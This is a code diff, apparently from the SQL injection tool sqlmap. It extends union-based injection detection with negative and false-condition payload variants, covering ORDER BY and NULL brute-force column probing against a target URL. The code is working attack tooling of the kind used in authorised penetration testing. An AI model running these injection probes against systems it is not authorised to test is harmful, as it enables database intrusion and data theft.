@@ -83,13 +83,13 @@ def __unionPosition(negative=False, falseCond=False):
 
     return validPayload
 
-def __unionConfirm():
+def __unionConfirm(negative=False, falseCond=False):
     validPayload = None
 
     # Confirm the inband SQL injection and get the exact column
-    # position
+    # position which can be used to extract data
     if not isinstance(kb.unionPosition, int):
-        validPayload = __unionPosition()
+        validPayload = __unionPosition(negative=negative, falseCond=falseCond)
 
         # Assure that the above function found the exploitable full inband
         # SQL injection position
@@ -114,7 +114,7 @@ def __unionConfirm():
 
     return validPayload
 
-def __unionTestByNULLBruteforce(comment):
+def __unionTestByNULLBruteforce(comment, negative=False, falseCond=False):
     """
     This method tests if the target url is affected by an inband
     SQL injection vulnerability. The test is done up to 50 columns
@@ -135,7 +135,7 @@ def __unionTestByNULLBruteforce(comment):
             query += " FROM DUAL"
 
         commentedQuery = agent.postfixQuery(query, comment)
-        payload        = agent.payload(newValue=commentedQuery)
+        payload        = agent.payload(newValue=commentedQuery, negative=negative, falseCond=falseCond)
         seqMatcher     = Request.queryPage(payload, getSeqMatcher=True)
 
         if seqMatcher >= 0.6:
@@ -145,14 +145,14 @@ def __unionTestByNULLBruteforce(comment):
 
     return columns
 
-def __unionTestByOrderBy(comment):
+def __unionTestByOrderBy(comment, negative=False, falseCond=False):
     columns     = None
     prevPayload = ""
 
     for count in range(1, 51):
         query        = agent.prefixQuery("ORDER BY %d" % count)
         orderByQuery = agent.postfixQuery(query, comment)
-        payload      = agent.payload(newValue=orderByQuery)
+        payload      = agent.payload(newValue=orderByQuery, negative=negative, falseCond=falseCond)
         seqMatcher   = Request.queryPage(payload, getSeqMatcher=True)
 
         if seqMatcher >= 0.6:
@@ -162,6 +162,16 @@ def __unionTestByOrderBy(comment):
             break
 
         prevPayload = payload
+
+    return columns
+
+def __unionTestAll(comment="", negative=False, falseCond=False):
+    columns = None
+
+    if conf.uTech == "orderby":
+        columns = __unionTestByOrderBy(comment, negative=negative, falseCond=falseCond)
+    else:
+        columns = __unionTestByNULLBruteforce(comment, negative=negative, falseCond=falseCond)
 
     return columns
 
@@ -188,20 +198,27 @@ def unionTest():
 
     validPayload = None
     columns = None
+    negative = False
+    falseCond = False
 
     for comment in (queries[kb.dbms].comment.query, ""):
-        if conf.uTech == "orderby":
-            columns = __unionTestByOrderBy(comment)
-        else:
-            columns = __unionTestByNULLBruteforce(comment)
+        columns = __unionTestAll(comment)
+
+        if not columns:
+            negative = True
+            columns = __unionTestAll(comment, negative=negative)
+
+        if not columns:
+            falseCond = True
+            columns = __unionTestAll(comment, falseCond=falseCond)
 
         if columns:
-            setUnion(comment=comment, count=columns)
+            setUnion(comment=comment, count=columns, negative=negative, falseCond=falseCond)
 
             break
 
     if kb.unionCount:
-        validPayload = __unionConfirm()
+        validPayload = __unionConfirm(negative=negative, falseCond=falseCond)
     else:
         warnMsg  = "the target url is not affected by an "
         warnMsg += "inband sql injection vulnerability"
